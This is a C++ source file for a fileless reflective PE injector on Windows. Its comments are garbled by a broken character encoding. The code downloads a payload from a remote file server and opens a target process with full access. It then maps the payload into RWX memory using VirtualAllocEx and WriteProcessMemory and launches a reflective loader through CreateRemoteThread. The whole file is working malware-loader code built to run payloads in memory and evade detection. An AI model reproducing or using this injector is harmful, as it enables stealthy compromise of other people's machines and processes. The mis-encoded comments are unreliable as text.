// �t�@�C�����X�̔��ˌ^PE�C���W�F�N�^�[
// ���o�s�\�Ȍ`�ŁA�y�C���[�h���h���b�v���ă��������Ŏ��s���܂�
#include "injector.h"

Arg arg;

// �G���g���|�C���g
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    std::wstring url = makeUrl(arg);

    // �v���Z�X������v���Z�XID���擾
    DWORD processId = 0;
    GetProcessIdToProcessName(arg.targetProcessName, processId);

    // �t�@�C���T�[�o�[����y�C���[�h���X�e�[�W���O
    std::vector<BYTE> shellcode;
    StagingPayload(url, shellcode);
    PBYTE payload = reinterpret_cast<PBYTE>(shellcode.data());

    // �v���Z�X���J��
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

    // �ePE�w�b�_�̐擪�A�h���X���擾
    PIMAGE_DOS_HEADER pOldDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(payload);
    PIMAGE_NT_HEADERS pOldNtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(payload + reinterpret_cast<PIMAGE_DOS_HEADER>(payload)->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOldOptionalHeader = &pOldNtHeader->OptionalHeader;
    PIMAGE_FILE_HEADER pOldFileHeader = &pOldNtHeader->FileHeader;

    // SizeOfImage���̃��������m��
    PBYTE pBase = reinterpret_cast<PBYTE>(VirtualAllocEx(processHandle, nullptr, pOldOptionalHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));

    // ���ˌ^���[�_�[�̈������i�[
    MANUAL_MAPPING_DATA data{};
    data.pLoadLibraryA = LoadLibraryA;
    data.pGetProcAddress = GetProcAddress;
    data.pBase = pBase;
    data.fdwReasonParam = DLL_PROCESS_ATTACH;
    data.reservedParam = 0;

    // �w�b�_�[���R�s�[
    WriteProcessMemory(processHandle, pBase, payload, pOldOptionalHeader->SizeOfHeaders, nullptr);

    // �Z�N�V�������R�s�[
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pOldNtHeader);
    for (UINT i = 0; i != pOldFileHeader->NumberOfSections; ++i, ++pSectionHeader) {
        if (pSectionHeader->SizeOfRawData) {
            WriteProcessMemory(processHandle, pBase + pSectionHeader->VirtualAddress, payload + pSectionHeader->PointerToRawData, pSectionHeader->SizeOfRawData, nullptr);
        }
    }

    // ���ˌ^���[�_�[����������
    PBYTE pReflectiveLoader = reinterpret_cast<PBYTE>(VirtualAllocEx(processHandle, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    WriteProcessMemory(processHandle, pReflectiveLoader, ReflectiveLoader, 0x1000, nullptr);

    // ���ˌ^���[�_�[�̈�������������
    LPVOID pReflectiveLoaderArg = VirtualAllocEx(processHandle, nullptr, sizeof(MANUAL_MAPPING_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(processHandle, pReflectiveLoaderArg, &data, sizeof(MANUAL_MAPPING_DATA), nullptr);

    // �����[�g�X���b�h���쐬���Ĕ��ˌ^���[�_�[���N��
    CreateRemoteThread(processHandle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pReflectiveLoader), pReflectiveLoaderArg, 0, nullptr);



    return 0;
}